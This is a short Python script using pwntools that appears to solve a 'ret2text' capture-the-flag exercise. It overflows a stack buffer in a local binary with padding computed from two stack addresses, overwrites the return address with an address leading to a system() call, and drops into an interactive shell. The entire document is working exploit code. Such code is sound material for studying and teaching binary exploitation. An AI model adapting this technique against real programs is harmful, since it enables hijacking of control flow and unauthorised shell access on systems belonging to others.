from pwn import *

system_addr = 0x0804863A
offset = 0xFFC96568-0xFFC964FC+4

sh = process("./ret2text")
sh.sendline(b'A'*offset+p32(system_addr))
sh.interactive()
